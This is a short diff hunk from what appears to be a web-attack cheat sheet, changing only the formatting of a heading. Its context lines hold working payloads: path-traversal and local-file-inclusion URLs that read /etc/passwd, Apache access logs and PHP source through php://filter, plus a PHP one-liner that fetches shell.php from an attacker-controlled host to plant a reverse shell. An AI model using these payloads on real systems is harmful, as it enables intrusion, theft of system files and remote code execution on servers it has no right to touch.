@@ -120,7 +120,7 @@ http://example.com/?view=php://filter/convert.base64-encode/cat/resource=index
 http://example.com/?view=../../../../etc/cat../passwd/&ext=
 http://example.com/?view=../../../../var/log/apache2/cat/../access.log&ext=
 ```
-### Uploading a reverse shell using get request
+Uploading a reverse shell using get request
 ```powershell
 <?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php')
 ```
